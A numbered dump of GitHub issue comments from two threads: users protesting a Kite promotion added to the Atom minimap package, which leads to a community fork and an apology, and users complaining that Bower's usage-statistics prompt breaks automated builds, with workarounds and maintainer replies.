I'm honestly just trying to offer some constructive feedback.  

I think you're screwing this up from a community/customer-relations standpoint. 

I think the comments in this thread strongly suggest that others agree. (And given that rule-of-thumb that only 1 in 10 customers will bother to complain to you, the other 9 will just quietly walk away, there are probably _many_ others that agree.) 

But I also think this is a really easy thing for the Kite team to repair by just saying ""oops, I guess we didn't really think that thru"" and splitting the functionality added in the ""kite promotion"" into a new stand-alone minimap-module.

I would guess there's been a noticeable drop-off in minimap users in the past month due to this issue, which should make this conclusion obvious.  But if there hasn't been, I'm pretty sure it's _not_ because people love this Kite integration, but because they aren't aware of it (as I've seen relatively little coverage of this issue compared to the number of minimap users).  But it's not hard to imagine that they could become aware of it (potentially quite suddenly from some viral coverage) and I don't think there is any reason to believe the average user's reaction to this ""kite promotion"" will be very different from the reaction already seen here.  But right now this still seems really easy to fix."
1111	"The problem in the Kite vs community war, declared by Kite team, is that a new module has a null user base, so it isn't as valuable as inserting something unwanted into 3.5M users.

I for one, like Kite, but would never use a service that has attacked me.
I hope the next Kite is managed towards users instead of money."
1112	Way to shove ad down our throats. 
1113	"Gotta admit, Atom's web-based foundation is making me a little worried.  If other packages start doing this, something like uBlock-Atom will become necessary.

On the other hand, Outbrain might pay quite a bit for some helpful code navigation links...  Might be a prime opportunity for someone!"
1114	@bronson Exactly. That's why we have to stand up against it now before it can become the norm.
1115	"Still nothing from any maintener. Really disappointed by the unwillingness to stand up for your actions @abe33.

@lee-dohm you said earlier

> Now that I am, I agree that this is a problematic pattern and have already planned to bring it up to the team on Monday.

Anything from that discussion you are able and willing to share?"
1116	"@adamsmith  

> This was a simple v1. I like the ideas for making it better.

It's been more than a month. Any updates on what the team has planned next? Any specific response to the many concerns raised here?"
1117	"Raise concerns _there_:
![20170622131818](https://user-images.githubusercontent.com/3426685/27431686-a796abba-574d-11e7-975c-94ce8ef38732.png)
![20170622131957](https://user-images.githubusercontent.com/3426685/27431688-aaab7466-574d-11e7-9d24-91c7d5f13cfe.png)
![20170622131953](https://user-images.githubusercontent.com/3426685/27431694-adb5d1f6-574d-11e7-83ba-d42a71bad65a.png)
"
1118	"> Anything from that discussion you are able and willing to share?

@kbrose I added a feature for [version-pinning packages](https://github.com/atom/settings-view/pull/950) so that people can force Atom to stick with a particular version of a package. It's not ideal but if nobody is willing to take on the work of maintaining a fork, then I guess it's the best option."
1119	"https://atom.io/packages/minimap-plus

---

I forked, renamed, and reverted the Kite nonsense. I'd appreciate it if anyone else wants to help. There are a handful of other housekeeping tasks to switch everything over (travis, docs, etc.)."
1120	Thanks for taking that step @mehcode! If you need help with anything let me know and I'll do what I can!
1121	@mehcode This is very much appreciated. Spread the word!
1122	"@mehcode thanks, much appreciated

if you want a big mess, I can help ;)
until that time, I'll better keep it on reporting bugs"
1123	"@mehcode Thanks.  Let me know if there is something specific I can do to help, but I'm not very strong with Travis so I'm probably useless there.

@ everyone else - I just noticed that the privacy policy on kite.com says that they collect ""Any source code files on your computer's hard drive that you have explicitly allowed our services to access.""  I guess that includes anything I open in Atom?  Any *.py file I open in Atom? 

No matter how well intentioned kite's service may be, is the typical minimap user comfortable trusting a startup they've never heard of to secure potentially extremely sensitive information?   (And does an opt-out button labeled ""disable python doc links"" two-screens down on the minimap settings page count as ""explicitly allowed""  in this context?)"
1124	"@mehcode, well done.
If you need community help I guess you should open some issues in your repo about specific things and label them with something like ""Help wanted""."
1125	"Thank you @mehcode!
I've previously tried to do same thing, but picking the exact needed renames took longer than the time I could spend on it. The only blocker I had was the plugin controls icon not showing, surely due to one of those renames. Dropping my repo/package now :)"
1126	"@rodw to get from using minimap to ""explicitly allowed our services to access"" would mean (1) clicking on a kite.com docs link in minimap, (2) clicking Download, (3) installing the Kite application onto your desktop, and (4) adding a directory to the Kite whitelist."
1127	"@adamsmith where did you find that info?  I don't see it described in either the privacy policy or FAQ on kite.com.

Also,

> We may revise this Privacy Policy from time to time. If there is a change that will impact you in a material way, we will notify you.

Presumably that would include notifying all users of the minimap plugin too?"
1128	"@adamsmith then what does the kite integration in minimap do? what info is shared with kite.com (or other third-party service) when ""python doc links"" are enabled and I visit a *.py file in atom with minimap open?"
1129	@rodw When it was first implemented and I looked into the code, it would send a list of all detected modules being imported in the code to `kite.com`. There's a comment earlier in this thread saying they changed that to a local offline lookup but I haven't reviewed the current code, and I doubt I ever will now that `minimap-plus` exists without this whole nonsense.
1130	"> When it was first implemented and I looked into the code, it would send a list of all detected modules being imported in the code to kite.com

Untrue.  The commit is linked in the first post on this thread.  @rodw no info is shared or sent at all.

"
1131	"@adamsmith Then what is the point of it (apart from a blatant advertisement of a documentation service in a package designed for a high level code overview to make visual scanning easy)? From watching the video of Kite, it _needs_ to send my code to Kite to do anything remotely useful.

I don't really want to get involved in the discussion here but can you or someone from Kite at least answer this without a dodge like ""Many users have found it useful""? You must agree that the whole point of Kite is the cloud code completion and documentation."
1132	"@adamsmith If you think what I said isn't true, then you aren't properly datamining your access logs.

Any link that was clicked from this ""promotion"" was being generated [here](https://github.com/atom-minimap/minimap/commit/16c11d82b889ce1260342e4fa7d6d1905c0fde45#diff-1520d05ec3a6bd1fbecf3bdfbe15e998R68) going to your site. The modules for those links were coming from the open file [here](https://github.com/atom-minimap/minimap/commit/16c11d82b889ce1260342e4fa7d6d1905c0fde45#diff-1520d05ec3a6bd1fbecf3bdfbe15e998R51).

Although I guess what I said was only half true, only if a user actually _used_ this ""promotion"" code would the modules get sent to your server. It had been several months since I last looked at this code.
"
1133	"This issue request is a bit long already so I won't write much.

Some weeks ago, after Adblock Plus in Firefox let through some advertisement, I searched as to why; then found out that Adblock Plus does not block ""acceptable"" ads.

I instantly removed Adblock Plus and switched to u-block origin, which is a more general content blocker, not just limited to ads.

I think that Atom should allow the same fine-grained control for users, everywhere, whenever they want to - be it in regards to the general user interface, and being able to change it, but also in regards of plugins and add-ons that pertain to the atom editor ""infrastructure"" as a whole.

I understand that developers who want to push down ads onto users will not be happy but there is no ""consensus"" possible in my opinion when it comes to users preferences - they must be able to decide how to use and what to use, when to use."
1134	This is bad advertising for Kite itself - not only for Minimap!
1135	"@shevegen All Atom packages run at the same level as the core editor code... meaning any package can ""monkey patch"" other packages to do what it wants. So ""uBlock for Atom"" is _possible_ now."
1136	**_Update:_** Editing this comment (but leaving this edit in place) per I made an incorrect assumption about this being a core part of Atom's functionality.
1137	"@bscottx `minimap` isn't part of the core Atom editor. 😕

As posted a bit earlier in the thread @mehcode has created a version that doesn't have any of this Kite stuff integrated. You can get that by running `apm install minimap-plus`."
1138	"Oh, I saw multiple people saying that it was. I misunderstood.

Glad to get some clarification."
1139	"@bscottx Probably the fault of the confusing wording of some of the posts complaining about how this Kite promotion has been integrated into the ""core minimap functionality"", which isn't part of Atom itself."
1140	"@adamsmith  @jlozano You just became the Apple/U2 of text editors. I have to wonder if your goal was to upset enough people that you'd generate real attention on various news sites and get Kite a ton of free publicity before your next funding round. That's the only sane explanation I can find for suddenly dropping ads into the core of one of the oldest and most useful Atom plugins. 

@mehcode Thanks for the fork. Just switched.

@lee-dohm Thanks for your thoughtful input. It must be sort of cool to be a part of the first text editor that needs an ad-blocker. That's something that even Emacs left to conkeror to achieve! 

"
1141	@jlozano Considering the user is not informed during the update, and doesn’t opt-in to this, you do realize that you are liable to pay for any and all costs incurred by users running this plugin via metered connections?
1142	draaaaaama
1143	"There might be legal consequences for this kind of plug-in enabled ads. For some content ads need to be explicitly marked as ADVERTISEMENT and apps containing ads are also to be marked visibly that they contain ads. I don't know if this applies here of if this situation is desirable by the Atom team.

Developers using open source (and OSS devs) are sensitive about the stuff they use and why some functionality is there (or why it's missing). This is about opinion and about having a ""clean"" experience and not having every piece of software infested with ads. There's no guarantee whatsoever that atom-minimap (or any other plugin) might not contain Google Ads or anything. 

All I know is that someone is trying to use Atom to sell their own product and including this functionality in atom-minimap (which is totally for something else) is hideous and just wrong in so many ways. The Atom devs not intervening is forcing a lot of Atom users to just quit using atom-minimap (and maybe fork it) or quit using Atom altogether.

So please remove this unwanted code from the plugin.

Best,
Steviee

"
1144	"The part that bugs me is that I had no option to allow this kind of ""feature"" when updating minimap, I wonder who opens the repo and checks the changelog for every package update in atom. The fact that this feature was never announced via a simple alert box or something (I suppose it would be nice to tell users that a feature someone will find usefull is now integrated, is worth mentioning, for instance: github integration directly in atom) does not sit well with me.

@steviee Fork here: https://github.com/mehcode/atom-minimap-plus"
1145	Just FYI, this issue and the resulting fork has now been linked on [HN](https://news.ycombinator.com/item?id=14790458).  This issue is famous (or infamous, however you'd like to look at it).
1146	Now that might result in quite some bad press. And imo rightfully so.
1147	@douglascamata minimap is not officially part of atom itself, it is just another plugin. The atom team has nothing to do with it and the community has already provided a fork.
1148	"""Free"" and open source package for source code minimaps, including ""sponsored"" feature from freemium service to analyse my code (no matter where): no, thanks. Going to the 100% free software solution.

If I wanted Kite I'd install `Kite`, not `minimap`.

@erikgeiser I just realized that. Removed old comment."
1149	Chiming in to say I do _not_ support this move by the minimap developer. I think it's a bad precedent and not what we end users want to see in Atom extensions. Switched to fork - kudos to the dev heading that up.
1150	"If you don't like it just remove the package, it's really simple.

Nobody forces you to use a piece of software or a plugin or a module or a theme.

Surely everyone has better things to do than rant & rave about something they dislike?

Just sayin!"
1151	@AlexNodex, the purpose of this issue is not to just rant, but to voice our concerns about behaviours and methods which we do not want to see being normalized and become a common practice.
1152	@dessant but a rant nontheless! :)
1153	"@AlexNodex, I guess most things can be dismissed as rants if you are inclined to do so, yes.
Going by that perspective we could also argue that your right to speak out your mind now is a result of a series of rants. But let's not continue the off-topic discussion."
1154	" > I just noticed that the privacy policy on kite.com says that they collect ""Any source code files on your computer's hard drive that you have explicitly allowed our services to access."" I guess that includes anything I open in Atom? Any *.py file I open in Atom?

So, if I'm editing a file that contains PII or PHI and I need to comply with HIPAA, it seems like unless I have a BAA with Kite.com, using minimap with Atom is now a HIPAA violation. That was unexpected.

@lee-dohm  I never worried that Vim or Emacs would leak data to a 3rd party company or cause a company to fail an audit. Is there any permissions/sandboxing model in the Atom road map that would 1)Prevent a plugin like this from causing a data breach and 2)Make auditors happy? It would be sad if the solution were ""You can't ever trust a text editor with this architecture to be secure.""

"
1155	@DevOpsJon No, there is not currently a permissions or sandboxing model on the roadmap. It is something we investigated in the past and something we would like to revisit in the future but there are no specific plans for when. Previous discussion around it can be found at https://github.com/atom/atom/issues/1763.
1156	I have just dis-installed atom.
1157	"@DevOpsJon the two people who commented on this issue are @adamsmith, the founder of Kite, who showed up after people weren't satisfied by the first explanations given by @jlozano, Kite's machine learning engineer, who has not [committed any code](https://github.com/atom-minimap/minimap/graphs/contributors) to this repo and has not [watched](https://github.com/atom-minimap/minimap/watchers) or [starred](https://github.com/jlozano?tab=stars) it. 

So when this issue arose, someone at Kite became aware of this and the person that they notified was the ML engineer & the ML engineer answered, not the contributor who wrote this plug-in (@abe33, who is a [Kite employee](https://kite.com/aboutus), even though he doesn't list it on [his linkedin](https://www.linkedin.com/in/nehemie/) [[h/t](https://github.com/autocomplete-python/autocomplete-python/issues/308#issue-228478634) @dessant]) or some kind of product or growth person. 

This and their propagandistic response to this wave of negative feedback indicates to me that these Kite package integrations aren't a PR issue, they are existential. i.e., Atom users aren't Kite's customer pool; they are their product. "
1158	"PS - the Kite promotion within `minimap` doesn't really do much. Anyone concerned with the Atom ecosystem and its standards should mosey on over to [`autocomplete-python`](https://github.com/autocomplete-python/autocomplete-python/issues/308), 967,989 users. 

[Upthread](https://github.com/atom-minimap/minimap/issues/588#issuecomment-301951083), the founder mentioned something about a three-screen install process (he's talking about `autocomplete-python` in this issue on the `minimap` repo -- I think he's confused about which repo he's commenting on) 

Anyway, if you install `autocomplete-python` and click-click-click through the install pages, did you just whitelist your entire user directory for them to upload? And download their app? And give them your email address? 
@DevOpsJon @rgawenda @rodw "
1159	I think atom developers should take responsibility for this and ban any plugin that collects user data. This is basically spyware. For the moment I am back to basic with vim.
1160	I agree with @laurieskelly. 
1161	"@hiromipaw Under your logic Atom should ban itself: https://github.com/atom/metrics

Granted that can be disabled by the user. The ""kite promotion"" here only sends them data if you click on a link it generates, the `autocomplete-python` implementation sounds like it might do more, I haven't looked into that one.

The benefit and price of Atom's package system is that it is extremely flexible in what can be accomplished within it. If you consider what this package does as collecting user data then you could say `linter-eslint` ""collects user data"" since it generates links to help pages for rules you have lint messages for. I have no control over the servers that documentation is hosted on, and those people are organizations that for the most part are just hosting the pages on GitHub, but it's the same basic _functionality_.

The major issue here is that this has _no_ place being in the `minimap` package and _is_ generating links to a company that is gathering user data. Oddly enough from @adamsmith's comment earlier it seems like they didn't think to actually _use_ the data coming from the `minimap` integration, but I wouldn't trust that data not being used to incompetence.

Since it's been a bit since it was posted, for anyone interested @mehcode has forked this package and removed the Kite code, you can install it by running `apm install minimap-plus`, or by searching for `minimap-plus` within Atom."
1162	@Arcanemagus that is not correct. It is one thing to collect some statistics and another thing to send user data to third party apps. Even if the company says it doesn't use the data, once this is collected and transmitted the user has lot control over it completely.
1163	@Arcanemagus, the metrics package asks permission before sending anything.  If you decline to give permission, it doesn't send anything.
1164	"My point was the over broad statement of ""any plugin that collects user data""."
1165	"Well, ""asks permission"" is quite a bit better than ""can be disabled""...   But I have to agree that the original point is pretty silly!"
1166	"Wandering back toward topic, I wonder if a good first step would be to put together something like an Atom package code of conduct.  I picture a list of best practices that well-behaved packages would agree to.  If a packages says in the README that it conforms, then we can be confident that -- were a transgression found -- a revert would be quickly merged.

Never accessing services without explicit permission would be on that list.  Also, I expect something about keeping packages focused would be on there too.  For example, if you want to add, say, Python smarts to the minimap, you'd have to do it with hooks and additional packages.  You couldn't just splat it in kitchen-sink style.

But, I gotta admit, that list might be pretty short."
1167	@bronson There is a more generic [code of conduct](http://contributor-covenant.org/version/1/2/0/) in the footer of [the Atom package listing](https://atom.io/packages). If it could be argued that this is unethical or unprofessional (which I believe there is a strong case for, given that Atom's own Metrics package asks permission), then this Kite integration would already be in violation.
1168	"@jacobsee true, calling what Kite did unprofessional is plausible but that's pretty subjective...  I'm hoping that, if a code was meant for the packages themselves, it could be nice and explicit.

One downside would be getting lawyered on your own side project by people using the Package Code of Conduct more like a weapon...  That's probably guaranteed to happen at some point, alas."
1169	"So, what can I say… 

Firstly, I must apologize for not replying on this thread before. I'm not good when it comes to communication skills and this kind of crisis management has created me a huge stress. That might sound lame, but it's sadly true, we're not all equal when it comes to stress managament, and I'm really bad at that. I wish I had @lee-dohm's coolness and de-escalating skills.

Secondly, even if it may seems to come late, we've heard you and decided to revert all the changes related to the python links feature. The next release will no longer show anything. I'll also make sure that the relation between Kite and the minimap package are as clear as possible. I've been an employee at Kite for over half a year now and this plugin is now officially maintained by Kite.

Again I'm deeply sorry for all that story. I should have be most wary of all the potential misunderstandings that move could create and while we never sent any code, nor any request to a third party I can understand that this was not explicit enough and probably hard to justify anyway."
1170	Thank you!
1171	"@abe33, could you also take care of this autocomplete-python issue? https://github.com/autocomplete-python/autocomplete-python/issues/308

Especially that biased engine selection dialog."
1172	"@abe33 Would you willing to add me as a member of atom-minimap with write access to this repository?

It would go a long way towards repairing user relations if someone impartial (not attached to Kite) had access to the repository. I would do my part (triage, bugs, etc.) as a maintainer.

---

I started the fork that removed Kite and the community is currently in the process of moving to it. It's currently a featured package in Atom. It would benefit the community if we can all be on a single package."
1173	"@mehcode ""@abe33 Would you willing to add me as a member of atom-minimap with write access to this repository?""

yes please

i'm a bit paranoid when
""Sorry for that, but now we are completely honest""
comes around

"
1174	In addition to giving @mehcode write access, please give write access to @laurieskelly
1175	Yes, I won't be moving back to the base minimap package (from the @mehcode fork) until there are some impartial people with commit access to keep things honest.
1176	"I just uninstalled Kite.

It's a real shame as the service was good, but nothing is good enough to justify advertisements in my work-space. The fight against distraction is hard enough as it is without having to think carefully about where I'm clicking due to dark-pattern UI.

Please note that reverting code doesn't repair trust.  As a general rule, don't f*#k with people's livelihoods.

Goodbye, Kite."
1177	"Kudos to @mehcode for the fork! And the author @abe33 for the apology! I'm thinking, that @abe33 might not be responsible for this, but was ""asked"" by his employer (Kite) to do that."
1178	"Any fork maintained by someone who isn't affiliated with Kite will be more trustworthy from now on. Adding @mehcode or anyone else here with write access won't resolve the trust issue on my side. I now prefer to use a minimap plugin with different maintainers as well as the ones who apologized here. I understand @mehcode 's intention to not to divide the community but sometimes a fork is not a division but a legitimate standing which reminds us not to mess with the ethos of open source software. If @mehcode or anyone else doesn't want to maintain a fork of this, it is still more reasonable to work without a minimap.

This comment is not intended to be a rage post for the Kite team, I hope they learn from their mistakes."
1179	jfc; in an effort to appease some people's problem with my complaining in an issue section i've revised my message: shame.
1180	Kite, taking over an open source project and adding ads and promotions to your company is not a cool move. The open source community is outraged at your business tactics. 
1181	This thread is no longer constructive at this point, and should probably be locked. /cc @abe33
1182	"@jonhoo, we could also just stay calm and on topic.

@mehcode's [request](https://github.com/atom-minimap/minimap/issues/588#issuecomment-316580070) to be added as a maintainer did not get a public response from the Kite team, I think that is worth waiting out before severing communication channels."
1183	@dessant hehe, I think that's good advice in general. The original topic of the issue has been resolved, and it's unclear that further discussion here matters (especially given that this thread was linked to from all over the internet a little while back). As for adding @mehcode (and others) as maintainers, that should probably have its own, separate issue.
1184	"Hello there, I've added @mehcode as a collaborator with write access on this repo.

As for locking down this thread, I'll probably do that at some point, I just don't want to make it looks like I'm trying to shut down criticism."
1185	"I've been added as a collaborator. I'll do my part to prevent this from happening again. Thank you all for the support. 

The original purpose of the thread is complete. If you have a bug or something to report, open another issue. If you want to keep venting, please do so elsewhere.

---

Thanks @abe33, I look forward to working with you to keep this awesome project going."
1186	@abe33, the damage caused in autocomplete-python still has to be addressed, please discuss it with your team and make a statement over at https://github.com/autocomplete-python/autocomplete-python/issues/308.
1187	@dessant This and that are two different projects. I haven't bothered to do anything about autocomplete-python because its effectively unofficially deprecated. Atom is doing a big push towards proper LSP integration and Python has an excellent [language server](https://github.com/palantir/python-language-server). I'm sure someone (I'd like to if I get time) will make the package. That package (once it exists) would give you auto-complete plus a whole lot more.
1188	What about forking that repo and removing the crap from it then re-release it on a different name?
1189	"@mehcode, thanks for the pointers, that certainly seems like the correct path to take. I did look into the autocomplete-python codebase, and regardless of its legacy architecture, it is also a mess, using deprecated Jedi APIs and requiring the cherry-picking of Jedi commits to do a dependency update.

@adam-arold, a fork was already published for minimap: https://atom.io/packages/minimap-plus.
Though the plan is to keep this repository in check and continue the work here. There is no good reason to further fragment the community now that the Kite promotion was removed and @mehcode has joined the project."
1190	">There is no good reason to further fragment the community

***NO!*** Bad @dessant! Bad!

Do not spread this bullshit about fragmenting the community. The whole point of open source is that anybody is able to make a fork, and allow the community to decide. A fragmented community is good. Another name for it would be distributed.

The entire reason this was even a big deal was because there is no where near enough competition, there is always the ""one"" tool to do something. That ""one"" plugin that provides a function, with the runner up (if it exist) having no where near the amount of users.

As a user base, we have stop collesasing around these tools and start spreading out more. As it is, these open source projects become single point of failures or other wise big targets because everybody is obsessed with using the #1 project.

So stop stigmatizing forking as ""fragmenting the community"""
1191	This conversation has served its purpose. I've locked the thread. If you need to further vent, please do so off of this project's issue tracker.
1192	"Obviously, we can do something like `yes no | bower install` but it's a bit hacky. 
"
1193	"Agreed. Silent should be silent.
"
1194	":+1: 
"
1195	":+1: 
"
1196	":+1:

Using worker: worker-linux-9-1.bb.travis-ci.org:travis-linux-14

![may-bower](https://f.cloud.github.com/assets/1211800/2385946/0a3e2b4c-a925-11e3-98cc-951a5698df65.png)
"
1197	"try @oroce's solution: 
`bower install | xargs echo`
should work
"
1198	"Or use bower@1.2 :)
"
1199	":+1: This is causing issues with my codeship build as well.
"
1200	"![](http://media.giphy.com/media/6kwZe7EbKLKEg/giphy.gif)
"
1201	"@gergelyke:

```
bower install | xargs echo
```

Solves the problem :-) Thanks!!
"
1202	"I don't think `bower install -s` is viable here... We shouldn't be forced to use a silent option with an automation tool just to keep it from asking us questions in build environments.  I would say make this an opt-in(preferable) or opt-out in .bowerrc.
"
1203	"This **must** be an opt-in. Releasing this feature just broke [thousands](https://github.com/search?p=2&q=%22bower+install%22+path%3A.travis.yml&ref=searchresults&type=Code) of travis build scripts.
"
1204	"For reference, the [CHANGELOG](https://github.com/bower/bower/blob/master/CHANGELOG.md#130---2014-03-10) recommends using `--config.interactive=false` for automated scripts.
"
1205	"&lt;sarcasm&gt;Oh that's great that the changelog mentions that. Totally makes up for a huge breaking change on a 0.1 version bump release.&lt;/sarcasm&gt;
"
1206	"Rolling insight out is a little painful but please hang in there, in the long run stats will be very beneficial to the community (think dashboard and API to query per-package stats https://github.com/bower/bower/issues/1164#issuecomment-38207751)
"
1207	"Is there a command we can run to manually opt-in when (or just after) we first install bower? That would be my preference, to make one change right at the beginning instead of having to change every single automated script I have.
"
1208	"Can we please add `--config.interactive=false` to the documentation/help?
"
1209	"I would _really_ prefer this to be manually opt-in rather than opt-out.

Bower, like any other tool, should play nicely with automation (in any form): for example, we're using it on a build server, where setting a ""CI"" variable would be a touch inaccurate.

I think an acceptable style to copy would be Git's behavior in 1.8 and 1.9 when the default push mode is unset: print a warning that the mode is unset, and give the commands that should be used to opt in or explicitly opt out, but _don't halt the entire thread of execution over it_.
"
1210	"Also, behaviors like this are leading us to strongly consider abandoning Bower altogether in favor of just vendoring scripts into the tree manually. We don't have time for tools that expect to be babysat.
"
1211	"We already have the `--config.interactive=false` mentioned [in the readme](https://github.com/bower/bower#interactive-configuration).
"
1212	"Hey guys, average user here. I'm new to the whole Grunt/Yeoman/Bower thing, so please bear with me. I was learning how to build an app with [yeoman/generator-mobile](https://github.com/yeoman/generator-mobile) (`yo mobile`) when the process just stopped for no apparent reason. After a minute or so, I hit enter to test if the generator was still responsive and then this popped up:

> [?] May bower anonymously report usage statistics to improve the tool over time? **Yes**

I'm not 100% sure whether I had accidentally scrolled up a line or not, but I'm fairly certain that the line wasn't in the output. In any case I didn't see it, and didn't intend to allow usage statistics. How do I deactivate them? Is this a setting hidden somewhere in the generated app or is this in some hidden bower config files? Can't find it in .bowerrc, but then again I have no idea what I'm doing here anyway. I'm currently blocking the script from phoning home with Little Snitch but that's not really satisfactory and bower.io has no information on it. Help, anyone?
"
1213	"@jdahdah I think you've raised a very good point, we need more documentation surrounding general config & analytics.

I've added a PR to address your concerns, and will ensure that its tracked through appropriately. 
For now, please keep all further commentary regarding disablement of analytics to the PR, or a new issue altogether. 

https://github.com/bower/bower/pull/1277
"
1214	"I agree. install/update must _always_ be silent. May be a good option would be to only show that prompt on `bower help`.
"
1215	"@ikr :+1: 
"
1216	"This was fixed a while back. If you're having problem please update bower to latest version or open a new ticket. This should be locked. 
"
1217	"If it still asks for insights on first run, _it's not fixed_. That behavior is _fundamentally flawed_.
"
1218	"@stuartpb @PitBeast can you be more specific? What version are you using? Did you set CI env var? Did you try with --silent? We want to make sure everything works for you, but you need to give us more info to work with.
"
1219	"I haven't checked, I'm just going by https://github.com/bower/bower/blob/master/bin/bower#L71 which still says ""Ask for Insights on first run"". This should never happen, even when the `CI` env var and `--silent` are unset. It should just not be in the code at all.
"
1220	"@stuartpb you can't really challenge the issue based on opinion and state that the functionality is flawed. That's the way it is, it's done that way for a reason.

A better way forward would be to make a proposal that can be discussed for its merits. 

Otherwise, I'm locking this issue as it's resolved. 
"
1221	"I thought the reasoning against this was laid out pretty succinctly above, but to sum it up, prompting on first run (unless the user specifies some variables they have no reason to expect they'd need):
- breaks existing code
- breaks automation
- breaks workflows on newly-imaged machines
- [interrupts users when they're busy with other things](http://heeris.id.au/2013/this-is-why-you-shouldnt-interrupt-a-programmer/)

This isn't just my opinion- this is the _stated experience and problems_ of ~10 users, right here, _just on this issue_.
"
1222	"Also, [I _did_ make a proposal](https://github.com/bower/bower/issues/1102#issuecomment-40032176): output a warning that your analytics preference hasn't been set, _but don't stop anything over it_.
"
1223	"I personally don't mind if it even defaults to being on. Just so long as there's a warning about it, and clear instructions in the warning on how to disable it.
If encouraging users to participate in analytics is the goal here, then surely there's a better way than simply documenting the status quo and leaving it.
"
1224	"I think the `if (process.stdout.isTTY) { askForAnalytics() }` should fix most of problems.
"
1225	"@stuartpb I don't buy it. `apt-get` will also break if you try to script without using the `-y` flag. 
Bower does the same, only the flag is `--config.interactive=false`

Existing code, if broken, has been broken since February when analytics shipped (admittedly, it should've been more than a point release, but that is another story). 

---

@sheerun Good suggestion. I think we should absolutely do that. 
"
1226	"@benschwarz I'm not sure apt-get is a great paradigm, since apt-get asking questions is a) crucial to its functionality, b) has been happening since its inception, and c) not built into most CI build scripts.  

The fact is, millions of builds have been run based on the expectation that bower isn't going to ask trivial questions, and one day, everything goes to hell.  apt-get's behavior is neither equivalent not relevant here.
"
1227	"I came across Bower for the first time today (via Zurb Foundation). Setting up a simple Salt state which I expected to run, didn't happen - which led me to read this whole comment thread.

So yeah, broken for a first time user. +1 for changing.
"
1228	"https://github.com/bower/bower/pull/1470 by @jfsiii will help, please take a look and provide feedback there. For now try `interactive` flag, set `CI` env var and use --quiet.
"
1229	"#1470 landed in [1.3.10](https://github.com/bower/bower/releases/tag/v1.3.10)

I believe the addresses the ""don't prompt on first run"" and ""don't require different CLI arguments for CI"" cases brought up by @stuartpb and others.
"
1230	"Just looked over the diffs in #1470. While that's _better_ (assuming `config.interactive` is determined by some automated method like `process.stdin.isTTY` and not an absurd unspoken command-line option), I'm still not satisfied with it:
1. It still interrupts the user and breaks _unattended_ (but still nominally ""interactive"") installation. Again: _use warnings, not prompts._
   
   Real life example: I was getting ready to go to a meetup, at which I was looking to tell people at the meetup about a new site I was working on with another developer. In a few spare moments, I pulled the code, ran ""bower install"", and walked away to get dressed while Bower installed. When I came back, I found that _nothing_ had installed, because Bower had popped up an annoying ""Do you want to help make Bower blah blah blah give us your info? [Y/n]"" prompt instead of _just doing what I'd asked when I asked it_. As a result, I missed my bus waiting for Bower to finish downloading so I could deploy the site, and had to show up at the meetup after all the seats were taken, and all the pizza and beer was already gone.
   
   This was a _fucking terrible_ user experience, and it's led me to swear off Bower for all future projects I work on a dev team with. If it were fixed so that _nothing like this will ever happen again_, I'd reconsider that stance.
2. If no preference is specified, it defaults to opt-in - it _needs_ to default to opt-out. The worst-case scenario defaulting to opt-out is you're going to miss some sample points in your analytics, and some devs don't get to be as smug as they could have been about their massive, throbbing metrics.
   
   The worst-case scenario defaulting to opt-in is you violate developers' deeply-held religious beliefs about privacy and eavesdropping, ever steadily eroding their faith in humanity (don't know if you've noticed, but [some people really care about this stuff](http://www.wired.com/2014/08/edward-snowden/)).
"
1231	"FYI 1.3.10 may have broken tracking, we're investigating it: https://github.com/bower/bower/pull/1507#issuecomment-55553665

@stuartpb thanks for the review. Here are my thoughts:
1. Can you expect a tool to know it's unattended if you don't tell it so?
2. I hear you on privacy concerns. The reason why we pour so much effort into collecting and surfacing stats is because the community asked for and love it. The anonymous data we track isn't any different than what's in the server logs that the registry server generates. We're using GA purely for convenience. We're fully transparent on what we track (https://github.com/yeoman/insight#collected-data). Do you know what data npm / apt-get / nuget is tracking, and are they asking for your permission?
"
1232	"> Can you expect a tool to know it's unattended if you don't tell it so?

**Yes.** Any tool that isn't strictly interactive should consider itself unattended. That is **exactly** what I expect.
"
1233	"> Do you know what data npm / apt-get / nuget is tracking, and are they asking for your permission?

I don't know about nuget (some Microsoft thing? I'll trust it as far as I can throw 'em), but AFAIK, the only analytics either npm or apt-get have (if they have any) are done on the registry rather than in the tool, from the anonymous information I'm _already giving them by requesting packages_. I could probably ask isaacs or Debian (or Canonical) what analytics their registries have implemented and they'd disclose it if somebody cared (I know npmjs.org keeps download counts because it shows them).

Either way, they've never interrupted me to ask if I can give them _more_.
"
1234	"It seems like all of this is caused by relying on third-party (GitHub) hosting. If there were dedicated Bower servers, then there would not be a need for the client to have this functionality at all.

What if project owners gave Bower permission to access their traffic statistics in GitHub? But then, why would these people not just be using GitHub traffic statistics directly? /shrug

Would it be possible to negotiate (if necessary) for the Bower client to point to packages in the npm registry? Although, I guess at that point we all may as well be using npm. /shrug
Now that npm hosting has been improved and they openly welcome front-end packages, has there been any work on merging key Bower features into npm and merging the communities?
"
1235	"@stuartpb Please try 1.3.10. Fresh installs shouldn't prompt. 

FWIW, here's the output from my local machine

```
‣ $(npm bin)/bower --version
1.3.8
‣ $(npm bin)/bower info bootstrap
[?] May bower anonymously report usage statistics to improve the tool over time? (Y/n)
^C

‣ $(npm bin)/bower info bootstrap
[?] May bower anonymously report usage statistics to improve the tool over time? (Y/n)
^C
```

```
‣ $(npm bin)/bower --version
1.3.10
‣ $(npm bin)/bower info bootstrap
bower bootstrap#*               cached git://github.com/twbs/bootstrap.git#3.2.0
bower bootstrap#*             validate 3.2.0 against git://github.com/twbs/bootstrap.git#*

{
  name: 'bootstrap',
  description: 'The most popular front-end framework for developing responsive, mobile first projects on the web.',
  version: '3.2.0',
  keywords: [
    'css',
    'js',
    'less',
    'mobile-first',
    'responsive',
    'front-end',
    'framework',
    'web'
  ],
  homepage: 'http://getbootstrap.com',
  main: [
    'less/bootstrap.less',
    'dist/css/bootstrap.css',
    'dist/js/bootstrap.js',
    'dist/fonts/glyphicons-halflings-regular.eot',
    'dist/fonts/glyphicons-halflings-regular.svg',
    'dist/fonts/glyphicons-halflings-regular.ttf',
    'dist/fonts/glyphicons-halflings-regular.woff'
  ],
  ignore: [
    '.*',
    '_config.yml',
    'CNAME',
    'composer.json',
    'CONTRIBUTING.md',
    'docs',
    'js/tests',
    'test-infra'
  ],
  dependencies: {
    jquery: '>= 1.9.0'
  }
}

Available versions:
  - 3.2.0
  - 3.1.1
  - 3.1.0
  - 3.0.3
  - 3.0.2
  - 3.0.1
  - 3.0.0
  - 3.0.0-rc1
  - 3.0.0-rc.2
  - 2.3.2
  - 2.3.1
  - 2.3.0
  - 2.2.2
